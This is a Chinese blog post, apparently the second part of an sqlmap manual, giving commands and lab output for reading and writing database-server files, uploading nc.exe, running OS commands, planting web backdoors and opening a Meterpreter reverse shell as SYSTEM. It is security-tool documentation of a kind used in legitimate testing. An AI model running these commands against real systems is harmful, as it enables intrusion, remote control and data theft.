@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文接Sqlmap之使用手册（上）其他高级用户自定义函数注入参数：--udf-inject,--shared-lib你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。">
+<meta name="keywords" content="sqlmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlmap之使用手册（下）">
+<meta property="og:url" content="https://choge.top/2019/12/08/Sqlmap之使用手册第二部分/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文接Sqlmap之使用手册（上）其他高级用户自定义函数注入参数：--udf-inject,--shared-lib你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-17T09:18:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqlmap之使用手册（下）">
+<meta name="twitter:description" content="本文接Sqlmap之使用手册（上）其他高级用户自定义函数注入参数：--udf-inject,--shared-lib你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。">
+  <link rel="canonical" href="https://choge.top/2019/12/08/Sqlmap之使用手册第二部分/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Sqlmap之使用手册（下） | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2019/12/08/Sqlmap之使用手册第二部分/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Sqlmap之使用手册（下）
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-08 11:28:25" itemprop="dateCreated datePublished" datetime="2019-12-08T11:28:25+08:00">2019-12-08</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-12-17 17:18:15" itemprop="dateModified" datetime="2019-12-17T17:18:15+08:00">2019-12-17</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>22k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>20 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文接Sqlmap之使用手册（上）</p><h2 id="其他高级"><a href="#其他高级" class="headerlink" title="其他高级"></a>其他高级</h2><h3 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h3><p>参数：<code>--udf-inject,--shared-lib</code></p><p>你可以通过编译<code>MySQL</code>注入你自定义的函数<code>（UDFs）或PostgreSQL</code>在<code>windows</code>中共享库，<code>DLL</code>，或者<code>Linux/Unix</code>中共享对象，</p><p><code>sqlmap</code>将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，<code>sqlmap</code>将会移除它们。</p><a id="more"></a>
+
+
+
+<h3 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h3><h4 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h4><p>参数：<code>--file-read</code></p>
+<p>当数据库为<code>MySQL，PostgreSQL</code>或<code>Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
+<p>列举一个Microsoft SQL Server 2005的例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"</span> \</span></span><br><span class="line">--file-read "C:/example.exe" -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">[hh:mm:50] [INFO] fetching file: 'C:/example.exe'</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l output/192.168.136.129/files/C__example.exe </span></span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> file output/192.168.136.129/files/C__example.exe </span></span><br><span class="line">output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel</span><br><span class="line">80386 32-bit</span><br></pre></td></tr></table></figure>
+
+<h4 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h4><p>参数：<code>--file-write,--file-dest</code></p>
+<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
+<p>列举一个MySQL的例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file /software/nc.exe.packed </span></span><br><span class="line">/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l /software/nc.exe.packed</span></span><br><span class="line">-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1"</span> --file-write \</span></span><br><span class="line">"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003 or 2008</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: MySQL &amp;gt;= 5.0.0</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully </span><br><span class="line">written on the back-end DBMS file system? [Y/n] y</span><br><span class="line">[hh:mm:52] [INFO] retrieved: 31744</span><br><span class="line">[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, </span><br><span class="line">same size as the local file '/software/nc.exe.packed'</span><br></pre></td></tr></table></figure>
+
+<h4 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h4><p>参数：<code>--os-cmd,--os-shell</code></p>
+<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQL Server</code>，并且当前用户有权限使用特定的函数。</p>
+<p>在<code>MySQL、PostgreSQL，sqlmap</code>上传一个二进制库，包含用户自定义的函数，<code>sys_exec()和sys_eval()</code>。</p>
+<p>那么他创建的这两个函数可以执行系统命令。在<code>Microsoft SQLServer，sqlmap</code>将会使用<code>xp_cmdshell</code>存储过程，</p>
+<p>如果被禁<code>（在Microsoft SQL Server2005</code>及以上版本默认禁制），<code>sqlmap</code>会重新启用它，如果不存在，会自动创建。</p>
+<p>列举一个PostgreSQL的例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1"</span> \</span></span><br><span class="line">--os-cmd id -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">[hh:mm:12] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:12] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist</span><br><span class="line">[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file</span><br><span class="line">[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'</span><br><span class="line"></span><br><span class="line">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class="line">do you want to remove UDF 'sys_eval'? [Y/n] y</span><br><span class="line">do you want to remove UDF 'sys_exec'? [Y/n] y</span><br><span class="line">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class="line">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can </span><br><span class="line">only be deleted manually</span><br></pre></td></tr></table></figure>
+
+<p>用<code>--os-shell</code>参数也可以模拟一个真实的<code>shell</code>，可以输入你想执行的命令。</p>
+<p>当不能执行多语句的时候（比如php或者asp的后端数据库为<code>MySQL</code>时），仍然可能使用<code>INTOOUTFILE</code>写进可写目录，来创建一个web后门。支持的语言：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、ASP</span><br><span class="line">2、ASP.NET</span><br><span class="line">3、JSP</span><br><span class="line">4、PHP</span><br></pre></td></tr></table></figure>
+
+<h4 id="Meterpreter配合使用"><a href="#Meterpreter配合使用" class="headerlink" title="Meterpreter配合使用"></a>Meterpreter配合使用</h4><p>参数：<code>--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path</code></p>
+<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立<code>TCP</code>连接，</p>
+<p>这个连接可以是一个交互式命令行的<code>Meterpreter</code>会话，<code>sqlmap</code>根据<code>Metasploit</code>生成<code>shellcode</code>，并有四种方式执行它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。</span><br><span class="line">2. 通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。</span><br><span class="line">3. 通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。</span><br><span class="line">4. 通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof</span><br></pre></td></tr></table></figure>
+
+<p>列举一个<code>MySQL</code>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line">&quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot; --os-pwn</span><br><span class="line">--msf-path /software/metasploit</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003</span><br><span class="line">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class="line">back-end DBMS: MySQL 5.0</span><br><span class="line">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class="line">how do you want to establish the tunnel?</span><br><span class="line">[1] TCP: Metasploit Framework (default)</span><br><span class="line">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:32] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:32] [INFO] fetching current user</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_bineval&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_exec&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:33] [INFO] retrieving MySQL base directory absolute path</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_bineval&apos; from the binary UDF file</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file</span><br><span class="line">how do you want to execute the Metasploit shellcode on the back-end database</span><br><span class="line">underlying</span><br><span class="line">operating system?</span><br><span class="line">[1] Via UDF &apos;sys_bineval&apos; (in-memory way, anti-forensics, default)</span><br><span class="line">[2] Stand-alone payload stager (file system way)</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode</span><br><span class="line">which connection type do you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on</span><br><span class="line">all ports</span><br><span class="line">between the specified and 65535</span><br><span class="line">[3] Bind TCP: Listen on the database host for a connection</span><br><span class="line">\&gt;</span><br><span class="line">which is the local address? [192.168.136.1]</span><br><span class="line">which local port number do you want to use? [60641]</span><br><span class="line">which payload do you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:40] [INFO] creation in progress ... done</span><br><span class="line">[hh:mm:43] [INFO] running Metasploit Framework command line interface locally,</span><br><span class="line">please wait..</span><br><span class="line">\_</span><br><span class="line">\| \| o</span><br><span class="line">\_ \_ \_ \_ \_\|\_ \__, , \_ \| \| \_\_ \_\|\_</span><br><span class="line">/ \|/ \|/ \| \|/ \| / \| / \\_\|/ \\_\|/ / \\_\| \|</span><br><span class="line">\| \| \|_/\|__/\|_/\\_/\|_/ \\/ \|__/ \|__/\\__/ \|_/\|_/</span><br><span class="line">/\|</span><br><span class="line">\\\|</span><br><span class="line">=[ metasploit v3.7.0-dev [core:3.7 api:1.0]</span><br><span class="line">\+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class="line">\+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class="line">=[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class="line">PAYLOAD =\&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">EXITFUNC =\&gt; thread</span><br><span class="line">LPORT =\&gt; 60641</span><br><span class="line">LHOST =\&gt; 192.168.136.1</span><br><span class="line">[\*] Started reverse handler on 192.168.136.1:60641</span><br><span class="line">[\*] Starting the payload handler...</span><br><span class="line">[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF</span><br><span class="line">&apos;sys_bineval&apos;,</span><br><span class="line">please wait..</span><br><span class="line">[\*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class="line">[\*] Meterpreter session 1 opened (192.168.136.1:60641 -\&gt;</span><br><span class="line">192.168.136.129:1689) at Mon Apr 11</span><br><span class="line">hh:mm:52 +0100 2011</span><br><span class="line">meterpreter \&gt; Loading extension espia...success.</span><br><span class="line">meterpreter \&gt; Loading extension incognito...success.</span><br><span class="line">meterpreter \&gt; [-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter \&gt; Loading extension sniffer...success.</span><br><span class="line">meterpreter \&gt; System Language : en_US</span><br><span class="line">OS : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Computer : W2K3R2</span><br><span class="line">Architecture : x86</span><br><span class="line">Meterpreter : x86/win32</span><br><span class="line">meterpreter \&gt; Server username: NT AUTHORITY\\SYSTEM</span><br><span class="line">meterpreter \&gt; ipconfig</span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address : 127.0.0.1</span><br><span class="line">Netmask : 255.0.0.0</span><br><span class="line">Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC: 00:0c:29:fc:79:39</span><br><span class="line">IP Address : 192.168.136.129</span><br><span class="line">Netmask : 255.255.255.0</span><br><span class="line">meterpreter \&gt; exit</span><br><span class="line">[\*] Meterpreter session 1 closed. Reason: User exit</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下MySQL在<code>Windows</code>上以<code>SYSTEM</code>权限运行，<code>PostgreSQL</code>在<code>Windows</code>与<code>Linux</code>中是低权限运行，</p>
+<p><code>Microsoft SQL Server 2000</code>默认是以<code>SYSTEM</code>权限运行与2008大部分是以<code>NETWORK SERVICE</code>有时是<code>LOCAL SERVICE</code>。</p>
+<h3 id="对Windows注册表操作"><a href="#对Windows注册表操作" class="headerlink" title="对Windows注册表操作"></a>对Windows注册表操作</h3><p>当数据库为<code>MySQL，PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前web应用支持堆查询。当然，当前连接数据库的用户也需要有权限操作注册表。</p>
+<h4 id="读取注册表"><a href="#读取注册表" class="headerlink" title="读取注册表"></a>读取注册表</h4><p>参数：<code>--reg-read</code></p>
+<h4 id="写入注册表"><a href="#写入注册表" class="headerlink" title="写入注册表"></a>写入注册表</h4><p>参数：<code>--reg-add</code></p>
+<h4 id="删除注册表值"><a href="#删除注册表值" class="headerlink" title="删除注册表值"></a>删除注册表值</h4><p>参数：<code>--reg-del</code></p>
